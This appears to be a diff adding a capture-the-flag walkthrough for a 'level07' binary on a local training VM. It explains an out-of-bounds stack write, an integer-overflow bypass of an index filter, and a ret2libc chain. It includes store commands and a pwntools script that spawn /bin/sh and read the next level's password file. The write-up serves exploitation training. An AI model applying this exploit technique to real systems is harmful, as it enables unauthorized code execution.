@@ -1,0 +1,98 @@
+# Level 07 Walkthrough - Index Out-of-Bounds Arbitrary Write -> ret2libc
+
+## 1.1 SSH into VM
+```
+sshpass -p `cat level06/flag` ssh -o StrictHostKeyChecking=no level07@localhost -p 4242
+```
+
+## Vulnerability
+
+`store_number(array)` writes a caller-supplied 32-bit value to `array[index]` with
+**no upper-bound check**.  Only two writes are blocked:
+
+1. `index % 3 == 0` — reserved indices
+2. `value >> 24 == 0xb7` — values whose top byte is `0xb7` (libc range guard)
+
+Everything else is an arbitrary write anywhere beyond the array on the stack.
+
+## Stack Layout
+
+`data[100]` starts at `esp+0x24` inside `main`.  The saved return address of
+`main` (pointing back into `__libc_start_main`) sits at offset **456 bytes**
+past the start of the array:
+
+```
+456 / 4 = index 114
+```
+
+Confirmed via `read_number`:
+```
+Number at data[114] is 4158936339   # 0xF7E45513 = __libc_start_main+243
+```
+
+## The % 3 Block and the Bypass
+
+Index 114 is divisible by 3 -> **blocked**.
+
+Bypass: use index `0x40000072`.
+
+```
+0x40000072 * 4 = 0x1_0000_01C8
+               ≡ 0x000001C8   (mod 2^32)
+               = 456           <- same stack offset
+0x40000072 % 3 = 1             <- NOT blocked
+```
+
+## libc Addresses (ASLR disabled)
+
+```
+system()   = 0xF7E6AED0
+exit()     = 0xF7E5EB70
+"/bin/sh"  = 0xF7F897EC
+```
+
+All three have safe top bytes (not `0xb7`), so the value filter does not
+block them.
+
+## ret2libc Chain
+
+Overwrite three consecutive words starting at the return address:
+
+| Stack slot  | Index           | Value        | Purpose              |
+|-------------|-----------------|--------------|----------------------|
+| ret addr    | `0x40000072`    | `0xF7E6AED0` | -> `system()`         |
+| ret from sys| `115`           | `0xF7E5EB70` | -> `exit()` (cleanup) |
+| arg 0       | `116`           | `0xF7F897EC` | -> `"/bin/sh"`        |
+
+When `main` executes its `ret`, control flows to `system("/bin/sh")`.
+
+## Exploit Commands
+
+```
+store  0xF7E6AED0  0x40000072   # system -> ret addr
+store  0xF7E5EB70  115          # exit   -> next word
+store  0xF7F897EC  116          # /bin/sh -> argument
+quit                             # trigger ret
+cat /home/users/level08/.pass
+```
+
+## One-liner (Python / pwntools)
+
+```python
+from pwn import ssh, p32
+
+s = ssh(host="localhost", port=4242, user="level07", password="<level07-pass>")
+p = s.run("/home/users/level07/level07")
+
+def store(val, idx):
+    p.recvuntil(b"Input command: "); p.sendline(b"store")
+    p.recvuntil(b"Number: ");        p.sendline(str(val).encode())
+    p.recvuntil(b"Index: ");         p.sendline(str(idx).encode())
+
+store(0xF7E6AED0, 0x40000072)
+store(0xF7E5EB70, 115)
+store(0xF7F897EC, 116)
+p.recvuntil(b"Input command: "); p.sendline(b"quit")
+p.sendline(b"cat /home/users/level08/.pass")
+print(p.recvrepeat(timeout=3))
+```
